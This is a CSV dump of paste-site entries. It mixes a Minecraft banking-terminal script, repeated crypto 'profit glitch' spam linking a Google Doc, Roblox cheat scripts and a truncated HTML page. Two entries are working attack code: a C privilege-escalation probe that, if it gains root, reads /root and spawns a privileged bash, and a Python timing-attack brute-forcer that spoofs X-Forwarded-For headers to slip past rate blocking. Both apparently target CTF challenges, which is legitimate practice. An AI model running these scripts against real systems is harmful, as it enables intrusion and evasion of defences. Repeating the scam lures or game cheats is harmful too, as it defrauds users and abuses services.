id,title,username,language,date,content
7eiLMVyF,Versamenti Qtz CAE,lego11,Lua,Saturday 1st of November 2025 10:23:40 AM CDT,"-- Versamenti CAE
-- Variabili config
local uri = ""http://172.16.20.220/luanet/servlets/vendite/cae""
local pb = ""7eiLMVyF""

local maxw, maxh = term.getSize()

ben = peripheral.wrap(""bottom"")

-- funzioni helper di base

function tablelength(T)
    local count = 0
    for _ in pairs(T) do
        count = count + 1
    end
    return count
end

function clear()
    term.clear()
    term.setCursorPos(1, 1)
end

function clearRed()
    sfondo(colors.red)
    term.clear()
    term.setCursorPos(1, 1)
end

function colore(sfumatura)
    term.setTextColour(sfumatura)
end

function sfondo(sfumaturaSfondo)
    term.setBackgroundColour(sfumaturaSfondo)
end

function fineColore()
    term.setTextColour(colours.white)
end

function fineSfondo()
    term.setBackgroundColour(colours.black)
end

-- IMPLEMENTAZIONE DEL DRAWFILLEDBOX
local function drawPixelInternal(xPos, yPos)
    term.setCursorPos(xPos, yPos)
    term.write("" "")
end

local tColourLookup = {}
for n = 1, 16 do
    tColourLookup[string.byte(""0123456789abcdef"", n, n)] = 2 ^ (n - 1)
end

function drawFilledBox(startX, startY, endX, endY, nColour)
    if type(startX) ~= ""number"" or type(startX) ~= ""number"" or type(endX) ~= ""number"" or type(endY) ~= ""number"" or
        (nColour ~= nil and type(nColour) ~= ""number"") then
        error(""Expected startX, startY, endX, endY, colour"", 2)
    end

    startX = math.floor(startX)
    startY = math.floor(startY)
    endX = math.floor(endX)
    endY = math.floor(endY)

    if nColour then
        term.setBackgroundColor(nColour)
    end
    if startX == endX and startY == endY then
        drawPixelInternal(startX, startY)
        return
    end

    local minX = math.min(startX, endX)
    if minX == startX then
        minY = startY
        maxX = endX
        maxY = endY
    else
        minY = endY
        maxX = startX
        maxY = startY
    end

    for x = minX, maxX do
        for y = minY, maxY do
            drawPixelInternal(x, y)
        end
    end
end

function titolo(testo)
    drawFilledBox(1, 1, maxw, 1, colors.yellow)
    term.setCursorPos((maxw - #testo) / 2, 1)
    colore(colors.black)
    term.write(testo)
    sfondo(colors.lightBlue)
end

function errore(errore)
    sfondo(colors.red)
    colore(colors.white)
    term.clear()
    term.setCursorPos(1, 1)
    titolo(""Errore irreversibile"")
    term.setCursorPos(1, 3)
    sfondo(colors.red)
    colore(colors.white)
    print(errore)
    print(""\n\n\nAttendere qualche secondo..."")
    os.sleep(5)
    os.reboot()
end

-- verifica servizi online e recupero prezzario

prezzario_raw = http.get(uri .. ""/?richiesta=prezzario_lua"").readAll()
prezzario = textutils.unserialize(prezzario_raw)

if type(prezzario) ~= ""table"" then
    errore(""Impossibile comunicare con il server interbancario"")
end

-- variabili quantità

counted_items = {}
id_items = {}

-- enumerazione prezzario

acceptedItems = """"

for k, v in pairs(prezzario) do
    id_items[ben.getItemIdentifierIDFor(v.id, v.meta)] = k
    acceptedItems = acceptedItems .. v.nome .. "", ""
end

-- PER DOPO print(""Item: "" .. id_items[v[1]] .. "" qty: "" .. v[2] .. "" price: "" .. prezzario[id_items[v[1]]][""prezzo""])

-- vuota il bancomat
ben.getAvailableItems()
i, j = os.pullEvent(""available_items_return"")

for k, v in pairs(j) do
    counted_items[id_items[v[1]]] = v[2]
    ben.makeRequest(v[1], v[2])
    sleep(0.1)
end

-- resetta counted_items e controlla se è vuoto

counted_items = {}

ben.getAvailableItems()
i, j = os.pullEvent(""available_items_return"")
for k, v in pairs(j) do
    counted_items[id_items[v[1]]] = v[2]
    sleep(0.1)
end

if tablelength(counted_items) ~= 0 then
    sfondo(colors.red)
    colore(colors.white)
    term.clear()
    term.setCursorPos(1, 1)
    titolo(""Errore irreversibile"")
    term.setCursorPos(1, 3)
    sfondo(colors.red)
    colore(colors.white)
    print(""Svuotamento non possibile, sportello fuori servizio"")
    print(""\n\n\nContattare il Banco di Nebraska"")
    os.sleep(60)
    os.reboot()
end

sfondo(colors.lightBlue)
clear()
titolo(""Banco di Nebraska - Sistema sportelli vendite"")
sfondo(colors.lightBlue)
print(""\n\n"")
print(""Questo sportello accetta: "" .. acceptedItems:sub(1, -3))

-- pulsante vendi
drawFilledBox(16, 15, 33, 17, colors.white)
term.setCursorPos(17, 16)
term.write(""Inizia a vendere"")

event = os.pullEvent()

sfondo(colours.lightBlue)
term.clear()
term.setCursorPos(1, 1)
titolo(""Accredita su Nebraska Pay"")
sfondo(colours.lightBlue)

term.setCursorPos(1, 3)
print(""Inserire i propri dati."")
colore(colors.gray)
print(
    ""Premere Enter per confermare i dati inseriti.\nSe i dati sono corretti, il campo diventerà verde.\nSe sono errati, il programma chiederà di reinserirli nuovamente."")

-- nomeutente
colore(colors.black)
term.setCursorPos(1, 9)
term.write(""Nome utente:"")
term.setCursorPos(15, 9)
fineColore()
utenteAccettato = false
conteggioErrori = 0
while utenteAccettato == false do
    utente = read()
    utente = string.gsub(utente, ""%s"", """")
    checkuser = http.get(""http://172.16.20.220/luanet/servlets/nebraskapay.php?auth=no&richiesta=verifica&utente="" ..
                             utente).readAll()
    tabcheckuser = textutils.unserialize(checkuser)
    if tabcheckuser.stato == ""OK"" then
        term.setCursorPos(15, 9)
        colore(colours.lime)
        term.write(utente)
        fineColore()
        utenteAccettato = true
    else
        term.setCursorPos(15, 9)
        colore(colours.red)
        term.write(""Utente errato!          "")
        sleep(2)
        term.setCursorPos(15, 9)
        fineColore()
        term.write(""                       "")
        term.setCursorPos(15, 9)
        conteggioErrori = conteggioErrori + 1
        if conteggioErrori > 2 then
            term.setCursorPos(15, 9)
            colore(colours.red)
            errore(""Troppi tentativi di immissione errati    "")
        end
    end
end
colore(colours.black)
term.setCursorPos(1, 11)
term.write(""Password:"")
term.setCursorPos(15, 11)
conteggioErrori = 0
passAccettata = false
while passAccettata == false do
    fineColore()
    password = read(""#"")
    colore(colours.black)
    checkuser = http.get(""http://172.16.20.220/luanet/servlets/nebraskapay.php?auth="" .. password ..
                             ""&richiesta=addebito&valore=0&utente="" .. utente).readAll()
    risposta = textutils.unserialize(checkuser)
    if risposta.stato == ""OK"" then
        term.setCursorPos(15, 11)
        colore(colours.lime)
        term.write(""##############               "")
        fineColore()
        passAccettata = true
    else
        term.setCursorPos(15, 11)
        colore(colours.red)
        term.write(""Password errata!            "")
        conteggioErrori = conteggioErrori + 1
        sleep(2)
        term.setCursorPos(15, 11)
        term.write(""                               "")
        term.setCursorPos(15, 11)
        if conteggioErrori > 2 then
            term.setCursorPos(15, 11)
            colore(colours.red)
            errore(""Troppi tentativi di immissione errati"")
        end
    end
end

credito = tonumber(risposta.saldo)
clear()

while true do

    titolo(""Pannello utente nPay"")
    term.setCursorPos(1, 3)
    term.write(""Benvenuto, "")
    colore(colors.white)
    term.write(utente)
    colore(colors.black)
    term.write(""!         Saldo: "")
    colore(colors.white)
    term.write(risposta.saldo)
    colore(colors.black)
    term.write("" IC"")
    print(""\n\nOperazioni disponibili:\n"")
    sfondo(colors.white)
    print("" Vendi oggetti          \n"")
    colore(colors.red)
    print("" Annulla operazione     \n"")
    colore(colors.black)

    antitonto = os.startTimer(60)

    event, key, x, y = os.pullEventRaw()
    if event == ""mouse_click"" and y == 7 and x <= 24 then
      sfondo(colors.lightBlue)
      clear()
        titolo(""Operazione di vendita - Passo 1"")

        redstone.setOutput(""left"", true)
        print(""\n\nInserire gli oggetti nello sportello a destra oppure collocare il Deep Storage di fronte al cubo rosso."")
        print("""")
        print(""Eventuali oggetti non accettati non verranno ritirati dal meccanismo.\n"")

        sfondo(colors.red)
        print(""ATTENZIONE: NON RIAVVIARE IL COMPUTER O SI PERDERA' IL VERSAMENTO"")
        sfondo(colors.lightBlue)

        print("""")
        print(""Quando si è pronti per continuare, premere un tasto qualsiasi."")
        os.pullEvent(""key"")

        clear()

        redstone.setOutput(""left"", false)
        titolo(""Operazione di vendita - Passo 2"")

        print(""\n\nConteggio oggetti venduti in corso..."")

        term.setCursorPos(3, 6)
        term.write(""*---"")
        sleep(0.5)
        term.setCursorPos(3, 6)
        term.write(""-*--"")
        sleep(0.5)
        term.setCursorPos(3, 6)
        term.write(""--*-"")
        sleep(0.5)
        term.setCursorPos(3, 6)
        term.write(""---*"")
        sleep(0.5)
        term.setCursorPos(3, 6)
        term.write(""--*-"")
        sleep(0.5)
        term.setCursorPos(3, 6)
        term.write(""-*--"")
        sleep(0.5)
        term.setCursorPos(3, 6)
        term.write(""*---"")
        sleep(0.5)

        ben = peripheral.wrap(""bottom"")
        ben.getAvailableItems()
        i, j = os.pullEvent(""available_items_return"")

        clear()

        -- vuota il bancomat
        ben.getAvailableItems()
        i, j = os.pullEvent(""available_items_return"")

        for k, v in pairs(j) do
            counted_items[id_items[v[1]]] = v[2]
            ben.makeRequest(v[1], v[2])
            sleep(0.1)
        end

        if tablelength(counted_items) == 0 then
            errore(""Nessun oggetto risulta essere stato introdotto"")
        end

        titolo(""Operazione di vendita - Passo 3"")
        print(""\n\nGli oggetti sono stati conteggiati correttamente.\nComunicazione con i servizi interbancari in corso..."")
        print("""")
        items_uri = """"

        for k, v in pairs(counted_items) do
            items_uri = items_uri .. ""&"" .. k .. ""="" .. v
        end

        inviaDenaro = http.get(uri .. ""/?richiesta=vendita&auth="" .. password .. ""&utente="" .. utente ..
                                   ""&richiesta=vendita"" .. items_uri).readAll()
        risultatoInvio = textutils.unserialize(inviaDenaro)
        if risultatoInvio.stato == ""OK"" then
            colore(colors.white)
        else
            clear()
            errore(""Errore durante il pagamento"")
            sleep(5)
            os.reboot()
        end
        sleep(1)
        print(""Comunicazione con i servizi fiscali in corso..."")
        sleep(1)
        clear()
        titolo(""Operazione di vendita conclusa"")
        print(""\n\nDenaro versato: "" .. math.abs(tonumber(risultatoInvio.credito) - tonumber(risultatoInvio.saldo)) .. "" IC"")
        print("""")
        print(""Il totale è stato comunicato all'Agenzia dei Tributi e comparirà nel proprio cassetto fiscale"")
        print("""")
        print(""Grazie!"")
        print("""")
        print(""Tra poco sarà possibile eseguire una nuova operazione."")
        sleep(10)
        term.setTextColor(colors.lightBlue)
        shell.run(""pastebin get "" .. pb ..  "" startup2"")
        if fs.exists(""startup2"") then
            shell.run(""rm startup"")
            shell.run(""mv startup2 startup"")
        end
        os.reboot()
      elseif event == ""mouse_click"" and y == 9 and x <= 24 then -- Pulsante disconnetti da nPay
        clear()
        break
    elseif event == ""timer"" and key == antitonto then -- Butta fuori l'utente se non fa niente
        disconnetti()
        break
    end
end
sfondo(colors.lightBlue)
clear()
print(""Attendere"")
term.setTextColor(colors.lightBlue)
sfondo(colors.lightBlue)
shell.run(""pastebin get "" .. pb .. "" startup2"")
if fs.exists(""startup2"") then
    shell.run(""rm startup"")
    shell.run(""mv startup2 startup"")
end
os.reboot()
"
GF28an7g,⚡ 🚀 Swapzone +37% profit glitch ✅✅,siraganbtawe,JavaScript,Saturday 1st of November 2025 10:07:50 AM CDT,"New methods just got posted on our channel

Recently Leaked:
Docs Link: docs.google.com/document/d/1-5zBr1XAR6FRYphwQ-sS-AFwLtcK24Pp-mOtDa9lnwA

Post hash: x2bwj4ojudgmnjqgdx3cy1mdwtl8sok2q584fkcwuu0rs2v8pu
"
Xg5DaE4T,Watch grass grow script,Min1mz,Lua,Saturday 1st of November 2025 09:59:17 AM CDT,"local args = {
	9999
}
game:GetService(""ReplicatedStorage""):WaitForChild(""Remotes""):WaitForChild(""UpdateFriendBonus""):FireServer(unpack(args))
-- sometimes the remote refreshes so just execute it again. this will give you a isnane boost in money after you sell ur plot 
-- how to play: join the game execute the script go on ur plot grass will grow when click sell plot after that it will give you more money then usual you cam rebirth for gems to get even more op pets"
jZ64tsCR,💎 🔥 Exchange profit method 📝✅,siraganbtawe,JavaScript,Saturday 1st of November 2025 09:42:48 AM CDT,"New methods just got posted on our channel

Recently Leaked:
Docs Link: docs.google.com/document/d/1-5zBr1XAR6FRYphwQ-sS-AFwLtcK24Pp-mOtDa9lnwA

Post hash: 30zgflqgfdylq0mlhfx578a835g5lp7ay0nul9h78l48y40lpw
"
Wd1Qc4hM,Untitled,Usif_,Bash,Saturday 1st of November 2025 09:38:59 AM CDT,"cat > sigscan.c <<'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>

static void handler(int sig){ /* swallow it / }

int main(){
    printf(""[] pid=%d\n"", getpid());
    struct sigaction sa; memset(&sa,0,sizeof(sa));
    sa.sa_handler = handler;
    sigfillset(&sa.sa_mask);
    /* catch most signals so we don't die /
    for(int s=1; s<65; s++) sigaction(s, &sa, NULL);

    uid_t u0 = getuid();
    for(int s=1; s<=64; s++){
        / skip SIGKILL(9) and SIGSTOP(19) which can't be caught anyway /
        if(s==9 || s==19) continue;
        printf(""[] sending signal %d ... "", s); fflush(stdout);
        /* call kill via syscall (some kits hook it) /
        long r = syscall(SYS_kill, getpid(), s);
        (void)r;
        usleep(200000); / 0.2s */
        uid_t u = getuid();
        printf(""uid=%d\n"", (int)u);
        if(u==0){
            printf(""[+] ROOT via signal %d!\n"", s);
            system(""id; ls -la /root; cat /root/flag 2>/dev/null || echo '[!] no flag match in /root'; ls -la ~"");
            execl(""/bin/bash"",""bash"",""-p"",NULL);
            return 0;
        }
    }
    printf(""[-] No signal flipped UID. Try other triggers.\n"");
    return 0;
}
EOF
gcc sigscan.c -o sigscan && ./sigscan

"
ZFA4Pd9r,Untitled,Usif_,Python,Saturday 1st of November 2025 09:27:44 AM CDT,"#!/usr/bin/env python3
import requests, time, statistics, random, sys

URL = ""http://IP:5000/submit""
TOTAL_HEX = 32
HEX = ""0123456789abcdef""

# ---- Tuning (good defaults for this target) ----
TOP_K = 5                 # refine only best K from coarse pass
FAST_TRIES = 1            # 1 quick coarse sample for all 16 candidates
REFINE_TRIES = 5          # baseline refine samples for top-K
MAX_REFINE_TRIES = 8      # upper bound if margin is too small
MARGIN_S = 0.020          # need ≥20ms gap to accept a winner
BASE_SLEEP = 0.07         # keep total rate ~6–8 rps with jitter
JITTER = 0.05
BLOCK_LEN = 75            # block page length you observed
SUBNET = ""10.1.156.""      # rotate last octet for XFF
USE_VIA = True            # small header variance

session = requests.Session()
session.headers.update({""Accept"": ""text/plain""})

def xff():
    return SUBNET + str(random.randint(2, 254))

def nap(mult=1.0):
    time.sleep(mult * (BASE_SLEEP + random.random() * JITTER))

def measure(prefix_hex: str, tries: int, method: str = ""HEAD"") -> float:
    """"""Median timing (server header preferred). Skips block-page samples.""""""
    attempt = f""flag{{{prefix_hex}{'0'*(TOTAL_HEX-len(prefix_hex))}}}""
    params = {""flag"": attempt}
    samples = []
    for _ in range(tries):
        headers = {""X-Forwarded-For"": xff()}
        if USE_VIA:
            headers[""Via""] = f""1.1 fw-{random.randint(100,999)}""
        t0 = time.perf_counter()
        r = session.request(method, URL, params=params, headers=headers, timeout=6)
        t1 = time.perf_counter()

        # prefer server timing; fallback to client timing
        h = r.headers.get(""X-Response-Time"")
        elapsed = None
        if h:
            try:
                elapsed = float(h)
            except ValueError:
                pass
        if elapsed is None:
            elapsed = (t1 - t0)

        body = r.text or """"
        if len(body) == BLOCK_LEN or ""Stop Hacking"" in body:
            # short bounded backoff; then continue
            nap(mult=10)
            continue

        samples.append(elapsed)
        nap()

    # If all tries got blocked, force a retry by returning a huge time
    if not samples:
        return 9e9
    return statistics.median(samples)

def rank_candidates(prefix: str, tries_fast=FAST_TRIES, tries_refine=REFINE_TRIES):
    # coarse pass across all 16
    coarse = []
    for ch in HEX:
        t = measure(prefix + ch, tries_fast, ""HEAD"")
        coarse.append((ch, t))
    coarse.sort(key=lambda x: x[1], reverse=True)
    top = coarse[:TOP_K]

    # refine top-K
    refined = []
    for ch, _ in top:
        t = measure(prefix + ch, tries_refine, ""HEAD"")
        refined.append((ch, t))
    refined.sort(key=lambda x: x[1], reverse=True)
    return coarse, refined

def pick_next(prefix: str) -> str:
    tries = REFINE_TRIES
    while True:
        coarse, refined = rank_candidates(prefix, FAST_TRIES, tries)
        best_ch, best_t = refined[0]
        second_t = refined[1][1] if len(refined) > 1 else 0.0

        # pretty log (trim to top-3 for readability)
        print(f""[{len(prefix)}] coarse top: {[(c, round(t,6)) for c,t in coarse[:3]]} ""
              f"" -> refine: {[(c, round(t,6)) for c,t in refined[:3]]}"")
        # accept if margin is clearly above threshold
        if best_t - second_t >= MARGIN_S or tries >= MAX_REFINE_TRIES:
            return best_ch
        # ambiguous → increase refine samples and retry only for top-K next loop
        tries = min(MAX_REFINE_TRIES, tries + 1)
        nap(mult=2)

def verify(flag_hex: str):
    params = {""flag"": f""flag{{{flag_hex}}}""}
    r = session.get(URL, params=params,
                    headers={""X-Forwarded-For"": xff(), ""Accept"": ""text/plain""},
                    timeout=8)
    print(""[*] Verify:"", r.status_code, ""len:"", len(r.text or """"))
    print((r.text or """")[:400])

def main():
    # quick HEAD baseline on a wrong flag
    base = measure(""0""*TOTAL_HEX, tries=1, method=""HEAD"")
    print(f""[*] Baseline (HEAD): t≈{base:.6f}s"")

    prefix = """"
    for i in range(TOTAL_HEX):
        ch = pick_next(prefix)
        prefix += ch
        print(f""[=] progress: flag{{{prefix}{'.'*(TOTAL_HEX-len(prefix))}}}"")
        nap(mult=2)

    print(""\n[+] Guessed flag hex:"", prefix)
    verify(prefix)

if __name__ == ""__main__"":
    try:
        main()
    except KeyboardInterrupt:
        print(""\nInterrupted."")
        sys.exit(1)
"
J0kAZj0h,💡 🚨 Free Crypto Method 🚨 📌🔥,siraganbtawe,JavaScript,Saturday 1st of November 2025 09:17:43 AM CDT,"New methods just got posted on our channel

Recently Leaked:
Docs Link: docs.google.com/document/d/1-5zBr1XAR6FRYphwQ-sS-AFwLtcK24Pp-mOtDa9lnwA

Post hash: mqv4tez317a9n4b423b00wna5zrnm1c8npzb67uwhgs445xahf
"
ew3LGh4S,⚡ 🚀 Swapzone +37% profit glitch ✅✅,Savagefart101,JavaScript,Saturday 1st of November 2025 08:02:30 AM CDT,"New methods just got posted on our channel

Recently Leaked:
Docs Link: docs.google.com/document/d/1-5zBr1XAR6FRYphwQ-sS-AFwLtcK24Pp-mOtDa9lnwA

Post hash: af5n7uk0f6lb2n08gtql9kwoav0sbrzbxbwnhfs1rb5hgrudc1
"
x9W5zsjv,Ye,QJL_RbxScriptsGROUP,Lua,Saturday 1st of November 2025 07:59:29 AM CDT,"-- Скрипт для ServerScriptService или StarterPlayerScripts
local Players = game:GetService(""Players"")
local RunService = game:GetService(""RunService"")
local UserInputService = game:GetService(""UserInputService"")
local TweenService = game:GetService(""TweenService"")

local player = Players.LocalPlayer
local character = player.CharacterAdded:Wait()
local humanoid = character:WaitForChild(""Humanoid"")

-- Создание GUI
local screenGui = Instance.new(""ScreenGui"")
screenGui.Name = ""NoClipGUI""
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = player.PlayerGui

-- Основной фрейм
local mainFrame = Instance.new(""Frame"")
mainFrame.Name = ""MainFrame""
mainFrame.Size = UDim2.new(0, 200, 0, 120)
mainFrame.Position = UDim2.new(0, 10, 0, 10)
mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
mainFrame.BorderSizePixel = 2
mainFrame.BorderColor3 = Color3.new(1, 0.5, 0)
mainFrame.Active = true
mainFrame.Draggable = false -- Мы реализуем перетаскивание самостоятельно
mainFrame.Parent = screenGui

-- Заголовок
local titleLabel = Instance.new(""TextLabel"")
titleLabel.Name = ""TitleLabel""
titleLabel.Size = UDim2.new(1, 0, 0, 30)
titleLabel.Position = UDim2.new(0, 0, 0, 0)
titleLabel.BackgroundColor3 = Color3.new(0, 0, 0)
titleLabel.BorderSizePixel = 0
titleLabel.Text = ""QJL RbxScripts""
titleLabel.TextColor3 = Color3.new(1, 0.5, 0)
titleLabel.TextScaled = true
titleLabel.Font = Enum.Font.GothamBold
titleLabel.Parent = mainFrame

-- Кнопка NoClip
local noClipButton = Instance.new(""TextButton"")
noClipButton.Name = ""NoClipButton""
noClipButton.Size = UDim2.new(0.8, 0, 0, 40)
noClipButton.Position = UDim2.new(0.1, 0, 0.4, 0)
noClipButton.BackgroundColor3 = Color3.new(1, 0.5, 0)
noClipButton.BorderSizePixel = 0
noClipButton.Text = ""NOCLIP OFF""
noClipButton.TextColor3 = Color3.new(0, 0, 0)
noClipButton.TextScaled = true
noClipButton.Font = Enum.Font.GothamBold
noClipButton.Parent = mainFrame

-- Переменные для состояния
local noClipEnabled = false
local noClipConnection = nil
local isDragging = false
local dragStart = nil
local frameStart = nil

-- Функция для перетаскивания GUI
local function onInputBegan(input, gameProcessed)
    if gameProcessed then return end
    
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        local mousePos = input.Position
        local framePos = mainFrame.AbsolutePosition
        local frameSize = mainFrame.AbsoluteSize
        
        -- Проверяем, находится ли клик внутри фрейма
        if mousePos.X >= framePos.X and mousePos.X <= framePos.X + frameSize.X and
           mousePos.Y >= framePos.Y and mousePos.Y <= framePos.Y + frameSize.Y then
            isDragging = true
            dragStart = mousePos
            frameStart = mainFrame.Position
            
            -- Визуальная обратная связь при перетаскивании
            local tween = TweenService:Create(mainFrame, TweenInfo.new(0.1), {BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)})
            tween:Play()
        end
    end
end

local function onInputChanged(input, gameProcessed)
    if gameProcessed then return end
    
    if isDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        local newPosition = UDim2.new(
            frameStart.X.Scale, 
            frameStart.X.Offset + delta.X,
            frameStart.Y.Scale, 
            frameStart.Y.Offset + delta.Y
        )
        mainFrame.Position = newPosition
    end
end

local function onInputEnded(input, gameProcessed)
    if gameProcessed then return end
    
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        if isDragging then
            isDragging = false
            
            -- Возвращаем обычный цвет
            local tween = TweenService:Create(mainFrame, TweenInfo.new(0.1), {BackgroundColor3 = Color3.new(0, 0, 0)})
            tween:Play()
        end
    end
end

-- Подключаем обработчики для перетаскивания
UserInputService.InputBegan:Connect(onInputBegan)
UserInputService.InputChanged:Connect(onInputChanged)
UserInputService.InputEnded:Connect(onInputEnded)

-- Функция NoClip
local function updateNoClip()
    if character and humanoid then
        for _, part in pairs(character:GetDescendants()) do
            if part:IsA(""BasePart"") and part.CanCollide then
                part.CanCollide = not noClipEnabled
            end
        end
    end
end

-- Обработчик переключения NoClip
noClipButton.MouseButton1Click:Connect(function()
    noClipEnabled = not noClipEnabled
    
    if noClipEnabled then
        noClipButton.Text = ""NOCLIP ON""
        -- Анимация при включении
        local tween = TweenService:Create(noClipButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.new(0, 1, 0)})
        tween:Play()
    else
        noClipButton.Text = ""NOCLIP OFF""
        -- Возвращаем оранжевый цвет
        local tween = TweenService:Create(noClipButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.new(1, 0.5, 0)})
        tween:Play()
    end
    
    updateNoClip()
end)

-- Постоянное обновление NoClip (на случай респавна персонажа)
if noClipConnection then
    noClipConnection:Disconnect()
end

noClipConnection = RunService.Stepped:Connect(function()
    if noClipEnabled and character then
        updateNoClip()
    end
end)

-- Обработчик респавна персонажа
player.CharacterAdded:Connect(function(newCharacter)
    character = newCharacter
    humanoid = character:WaitForChild(""Humanoid"")
    
    -- Сбрасываем NoClip при респавне
    if noClipEnabled then
        noClipEnabled = false
        noClipButton.Text = ""NOCLIP OFF""
        local tween = TweenService:Create(noClipButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.new(1, 0.5, 0)})
        tween:Play()
    end
end)

-- Анимация появления
mainFrame.Size = UDim2.new(0, 0, 0, 0)
local appearTween = TweenService:Create(mainFrame, TweenInfo.new(0.5), {Size = UDim2.new(0, 200, 0, 120)})
appearTween:Play()

print(""NoClip GUI загружен! Перетаскивайте окно для перемещения."")"
AcxagSAY,💎 🔥 Exchange profit method 📝✅,Savagefart101,JavaScript,Saturday 1st of November 2025 07:37:26 AM CDT,"New methods just got posted on our channel

Recently Leaked:
Docs Link: docs.google.com/document/d/1-5zBr1XAR6FRYphwQ-sS-AFwLtcK24Pp-mOtDa9lnwA

Post hash: 4ehd3falt0ud4yuc21luezbv3xm39f9hxyjv73lh3cj4zdb1k1
"
3fsySb4K,💡 🚨 Free Crypto Method 🚨 📌🔥,Savagefart101,JavaScript,Saturday 1st of November 2025 07:12:23 AM CDT,"New methods just got posted on our channel

Recently Leaked:
Docs Link: docs.google.com/document/d/1-5zBr1XAR6FRYphwQ-sS-AFwLtcK24Pp-mOtDa9lnwA

Post hash: fk8xncdvgut5zx5m1rpbzjuwzncba758drtzxfu469rfartoou
"
BhjxPBps,مقال الثراء_code,bolbolegypt,HTML,Saturday 1st of November 2025 06:51:03 AM CDT,"<!DOCTYPE html>
<html lang=""ar"" dir=""rtl"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>لو كان الثراء رجلاً لقتلته - المقال الكامل</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Cairo:wght@300;400;600;700&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* إضافة حركة انتقال سلسة */
        html {
            scroll-behavior: smooth;
